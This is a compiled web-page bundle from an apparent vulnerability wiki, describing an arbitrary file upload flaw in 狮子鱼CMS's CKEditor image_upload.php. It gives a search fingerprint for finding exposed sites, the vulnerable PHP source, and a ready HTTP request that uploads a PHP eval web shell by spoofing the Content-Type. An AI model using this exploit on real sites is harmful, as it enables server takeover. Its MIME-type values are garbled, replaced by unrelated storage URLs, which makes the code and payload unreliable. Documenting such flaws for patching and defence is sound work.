import{_ as p}from"./plugin-vue_export-helper-c27b6911.js";import{r as e,o,c as i,a as n,b as s,d as l,e as a}from"./app-58e4a7d6.js";const c={},u=a(`<h2 id="漏洞描述" tabindex="-1"><a class="header-anchor" href="#漏洞描述" aria-hidden="true">#</a> 漏洞描述</h2><p>狮子鱼CMS使用CK编辑器，存在图片上传的绕过，造成 image_upload.php 任意文件上传</p><h2 id="漏洞影响" tabindex="-1"><a class="header-anchor" href="#漏洞影响" aria-hidden="true">#</a> 漏洞影响</h2><div class="language-text line-numbers-mode" data-ext="text"><pre class="language-text"><code>狮子鱼CMS
</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div></div></div><h2 id="网络测绘" tabindex="-1"><a class="header-anchor" href="#网络测绘" aria-hidden="true">#</a> 网络测绘</h2><div class="language-text line-numbers-mode" data-ext="text"><pre class="language-text"><code>&quot;/seller.php?s=/Public/login&quot;
</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div></div></div><h2 id="漏洞复现" tabindex="-1"><a class="header-anchor" href="#漏洞复现" aria-hidden="true">#</a> 漏洞复现</h2><p>登录页面如下</p><figure><img src="https://cb86160.webp.li/makabaka-r1-photo/202202170928345.png" alt="" tabindex="0" loading="lazy"><figcaption></figcaption></figure><p>漏洞文件为 CK编辑器的 image_upload.php</p><div class="language-php line-numbers-mode" data-ext="php"><pre class="language-php"><code><span class="token php language-php"><span class="token delimiter important">&lt;?php</span>
 <span class="token function">define</span> <span class="token punctuation">(</span> <span class="token string single-quoted-string">&#39;IN_BAMBOO&#39;</span><span class="token punctuation">,</span> <span class="token constant boolean">true</span> <span class="token punctuation">)</span><span class="token punctuation">;</span>
 <span class="token comment">// 取得根目录</span>
<span class="token function">define</span> <span class="token punctuation">(</span> <span class="token string single-quoted-string">&#39;ROOT_PATH&#39;</span><span class="token punctuation">,</span> <span class="token string single-quoted-string">&#39;../../../../&#39;</span> <span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token comment">// back to your root path</span>

<span class="token variable">$arrType</span> <span class="token operator">=</span> <span class="token keyword">array</span> <span class="token punctuation">(</span>
		<span class="token string single-quoted-string">&#39;http://peiqi-wiki-poc.oss-cn-beijing.aliyuncs.com/vuln/jpg&#39;</span><span class="token punctuation">,</span>
		<span class="token string single-quoted-string">&#39;http://peiqi-wiki-poc.oss-cn-beijing.aliyuncs.com/vuln/gif&#39;</span><span class="token punctuation">,</span>
		<span class="token string single-quoted-string">&#39;http://peiqi-wiki-poc.oss-cn-beijing.aliyuncs.com/vuln/png&#39;</span><span class="token punctuation">,</span>
		<span class="token string single-quoted-string">&#39;http://peiqi-wiki-poc.oss-cn-beijing.aliyuncs.com/vuln/bmp&#39;</span><span class="token punctuation">,</span>
		<span class="token string single-quoted-string">&#39;http://peiqi-wiki-poc.oss-cn-beijing.aliyuncs.com/vuln/pjpeg&#39;</span><span class="token punctuation">,</span>
		<span class="token string single-quoted-string">&#39;http://peiqi-wiki-poc.oss-cn-beijing.aliyuncs.com/vuln/jpeg&#39;</span> 
<span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token variable">$max_size</span> <span class="token operator">=</span> <span class="token number">500</span> <span class="token operator">*</span> <span class="token number">1024</span><span class="token punctuation">;</span> <span class="token comment">// 最大文件限制（单位：byte）</span>
<span class="token variable">$upfile</span> <span class="token operator">=</span> <span class="token constant">ROOT_PATH</span><span class="token operator">.</span><span class="token string single-quoted-string">&#39;http://peiqi-wiki-poc.oss-cn-beijing.aliyuncs.com/vuln/uploads&#39;</span><span class="token punctuation">;</span> <span class="token comment">// 图片目录路径</span>
<span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">!</span><span class="token keyword">isset</span><span class="token punctuation">(</span><span class="token variable">$_FILES</span> <span class="token punctuation">[</span><span class="token string single-quoted-string">&#39;files&#39;</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">{</span>
	<span class="token keyword">echo</span> <span class="token string single-quoted-string">&#39;{&quot;result&quot;:&quot;400&quot;,&quot;msg&quot;:&quot;未能找到图片，请确认图片是否过大&quot;}&#39;</span><span class="token punctuation">;</span>
	<span class="token keyword">exit</span> <span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token punctuation">}</span>
<span class="token variable">$file</span> <span class="token operator">=</span> <span class="token variable">$_FILES</span> <span class="token punctuation">[</span><span class="token string single-quoted-string">&#39;files&#39;</span><span class="token punctuation">]</span><span class="token punctuation">;</span>

<span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token variable">$_SERVER</span> <span class="token punctuation">[</span><span class="token string single-quoted-string">&#39;REQUEST_METHOD&#39;</span><span class="token punctuation">]</span> <span class="token operator">==</span> <span class="token string single-quoted-string">&#39;POST&#39;</span><span class="token punctuation">)</span> <span class="token punctuation">{</span> <span class="token comment">// 判断提交方式是否为POST</span>
	<span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">!</span> <span class="token function">is_uploaded_file</span> <span class="token punctuation">(</span> <span class="token variable">$file</span> <span class="token punctuation">[</span><span class="token string single-quoted-string">&#39;tmp_name&#39;</span><span class="token punctuation">]</span> <span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span> <span class="token comment">// 判断上传文件是否存在</span>
		<span class="token keyword">echo</span> <span class="token string single-quoted-string">&#39;{&quot;result&quot;:&quot;400&quot;,&quot;msg&quot;:&quot;图片不存在&quot;}&#39;</span><span class="token punctuation">;</span>
		<span class="token keyword">exit</span> <span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
	<span class="token punctuation">}</span>
	
	<span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token variable">$file</span> <span class="token punctuation">[</span><span class="token string single-quoted-string">&#39;size&#39;</span><span class="token punctuation">]</span> <span class="token operator">&gt;</span> <span class="token variable">$max_size</span><span class="token punctuation">)</span> <span class="token punctuation">{</span> <span class="token comment">// 判断文件大小是否大于500000字节</span>
		<span class="token keyword">echo</span> <span class="token string single-quoted-string">&#39;{&quot;result&quot;:&quot;400&quot;,&quot;msg&quot;:&quot;上传图片太大，最大支持：&#39;</span><span class="token operator">.</span><span class="token punctuation">(</span><span class="token variable">$max_size</span><span class="token operator">/</span><span class="token number">1024</span><span class="token punctuation">)</span><span class="token operator">.</span><span class="token string single-quoted-string">&#39;KB&quot;}&#39;</span><span class="token punctuation">;</span>
		<span class="token keyword">exit</span> <span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
	<span class="token punctuation">}</span>
	<span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">!</span> <span class="token function">in_array</span> <span class="token punctuation">(</span> <span class="token variable">$file</span> <span class="token punctuation">[</span><span class="token string single-quoted-string">&#39;type&#39;</span><span class="token punctuation">]</span><span class="token punctuation">,</span> <span class="token variable">$arrType</span> <span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span> <span class="token comment">// 判断图片文件的格式</span>
		<span class="token keyword">echo</span> <span class="token string single-quoted-string">&#39;{&quot;result&quot;:&quot;400&quot;,&quot;msg&quot;:&quot;上传图片格式不对&quot;}&#39;</span><span class="token punctuation">;</span>
		<span class="token keyword">exit</span> <span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
	<span class="token punctuation">}</span>
	<span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">!</span> <span class="token function">file_exists</span> <span class="token punctuation">(</span> <span class="token variable">$upfile</span> <span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span> <span class="token comment">// 判断存放文件目录是否存在</span>
		<span class="token function">mkdir</span> <span class="token punctuation">(</span> <span class="token variable">$upfile</span><span class="token punctuation">,</span> <span class="token number">0777</span><span class="token punctuation">,</span> <span class="token constant boolean">true</span> <span class="token punctuation">)</span><span class="token punctuation">;</span>
	<span class="token punctuation">}</span>
	<span class="token variable">$imageSize</span> <span class="token operator">=</span> <span class="token function">getimagesize</span> <span class="token punctuation">(</span> <span class="token variable">$file</span> <span class="token punctuation">[</span><span class="token string single-quoted-string">&#39;tmp_name&#39;</span><span class="token punctuation">]</span> <span class="token punctuation">)</span><span class="token punctuation">;</span>
	<span class="token variable">$img</span> <span class="token operator">=</span> <span class="token variable">$imageSize</span> <span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span> <span class="token operator">.</span> <span class="token string single-quoted-string">&#39;*&#39;</span> <span class="token operator">.</span> <span class="token variable">$imageSize</span> <span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
	<span class="token variable">$fname</span> <span class="token operator">=</span> <span class="token variable">$file</span> <span class="token punctuation">[</span><span class="token string single-quoted-string">&#39;name&#39;</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
	<span class="token variable">$ftype</span> <span class="token operator">=</span> <span class="token function">explode</span> <span class="token punctuation">(</span> <span class="token string single-quoted-string">&#39;.&#39;</span><span class="token punctuation">,</span> <span class="token variable">$fname</span> <span class="token punctuation">)</span><span class="token punctuation">;</span>
	<span class="token variable">$time</span> <span class="token operator">=</span> <span class="token function">explode</span> <span class="token punctuation">(</span> <span class="token string double-quoted-string">&quot; &quot;</span><span class="token punctuation">,</span> <span class="token function">microtime</span> <span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">)</span><span class="token punctuation">;</span>
	<span class="token variable">$time</span> <span class="token operator">=</span> <span class="token variable">$time</span> <span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span> <span class="token operator">.</span> <span class="token punctuation">(</span><span class="token variable">$time</span> <span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span> <span class="token operator">*</span> <span class="token number">1000</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
	<span class="token variable">$time2</span> <span class="token operator">=</span> <span class="token function">explode</span> <span class="token punctuation">(</span> <span class="token string double-quoted-string">&quot;.&quot;</span><span class="token punctuation">,</span> <span class="token variable">$time</span> <span class="token punctuation">)</span><span class="token punctuation">;</span>  
	<span class="token variable">$time</span> <span class="token operator">=</span> <span class="token variable">$time2</span> <span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
	<span class="token variable">$returnName</span><span class="token operator">=</span><span class="token variable">$time</span><span class="token operator">.</span><span class="token string double-quoted-string">&quot;.&quot;</span> <span class="token operator">.</span><span class="token function">end</span><span class="token punctuation">(</span><span class="token variable">$ftype</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
	<span class="token variable">$picName</span> <span class="token operator">=</span> <span class="token variable">$upfile</span> <span class="token operator">.</span> <span class="token string double-quoted-string">&quot;/&quot;</span> <span class="token operator">.</span> <span class="token variable">$returnName</span> <span class="token punctuation">;</span>
	
	<span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">!</span> <span class="token function">move_uploaded_file</span> <span class="token punctuation">(</span> <span class="token variable">$file</span> <span class="token punctuation">[</span><span class="token string single-quoted-string">&#39;tmp_name&#39;</span><span class="token punctuation">]</span><span class="token punctuation">,</span> <span class="token variable">$picName</span> <span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
		<span class="token keyword">echo</span> <span class="token string single-quoted-string">&#39;{&quot;result&quot;:&quot;400&quot;,&quot;msg&quot;:&quot;从:&#39;</span><span class="token operator">.</span><span class="token variable">$file</span> <span class="token punctuation">[</span><span class="token string single-quoted-string">&#39;tmp_name&#39;</span><span class="token punctuation">]</span><span class="token operator">.</span><span class="token string single-quoted-string">&#39;移动图片到:&#39;</span><span class="token operator">.</span><span class="token variable">$picName</span><span class="token operator">.</span><span class="token string single-quoted-string">&#39;出错&quot;}&#39;</span><span class="token punctuation">;</span>
		<span class="token keyword">exit</span> <span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
	<span class="token punctuation">}</span> <span class="token keyword">else</span> <span class="token punctuation">{</span>
		<span class="token keyword">echo</span> <span class="token string single-quoted-string">&#39;{&quot;result&quot;:&quot;200&quot;,&quot;imgurl&quot;:&quot;http://peiqi-wiki-poc.oss-cn-beijing.aliyuncs.com/vuln/uploads/&#39;</span> <span class="token operator">.</span> <span class="token variable">$returnName</span> <span class="token operator">.</span> <span class="token string single-quoted-string">&#39;&quot;}&#39;</span><span class="token punctuation">;</span>
	<span class="token punctuation">}</span>
<span class="token punctuation">}</span>

<span class="token delimiter important">?&gt;</span></span>
</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div>`,11),r=n("strong",null,"Content-Type:",-1),k={href:"http://peiqi-wiki-poc.oss-cn-beijing.aliyuncs.com/vuln/gif",target:"_blank",rel:"noopener noreferrer"},d=n("strong",null,"http://peiqi-wiki-poc.oss-cn-beijing.aliyuncs.com/vuln/gif",-1),v=a(`<div class="language-plain line-numbers-mode" data-ext="plain"><pre class="language-plain"><code>POST /Common/ckeditor/plugins/multiimg/dialogs/image_upload.php HTTP/2
Host: 
Content-Type: multipart/form-data;boundary=----WebKitFormBoundary8UaANmWAgM4BqBSs
Content-Length: 208

------WebKitFormBoundary8UaANmWAgM4BqBSs
Content-Disposition: form-data; name=&quot;files&quot;; filename=&quot;test.php&quot;
Content-Type: http://peiqi-wiki-poc.oss-cn-beijing.aliyuncs.com/vuln/gif

&lt;?php @eval($_POST[test]);?&gt;
------WebKitFormBoundary8UaANmWAgM4BqBSs—
</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div><figure><img src="https://cb86160.webp.li/makabaka-r1-photo/202202170928692.png" alt="" tabindex="0" loading="lazy"><figcaption></figcaption></figure><p>访问返回的文件路径</p><div class="language-plain line-numbers-mode" data-ext="plain"><pre class="language-plain"><code>/Common/http://peiqi-wiki-poc.oss-cn-beijing.aliyuncs.com/vuln/uploads/xxxxx.php
</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div></div></div><figure><img src="https://cb86160.webp.li/makabaka-r1-photo/202202170928744.png" alt="" tabindex="0" loading="lazy"><figcaption></figcaption></figure>`,5);function m(g,b){const t=e("ExternalLinkIcon");return o(),i("div",null,[u,n("p",null,[s("其中使用 "),r,s(),n("a",k,[d,l(t)]),s(" 即可绕过上传PHP文件")]),v])}const f=p(c,[["render",m],["__file","狮子鱼CMS image_upload.php 任意文件上传.html.vue"]]);export{f as default};
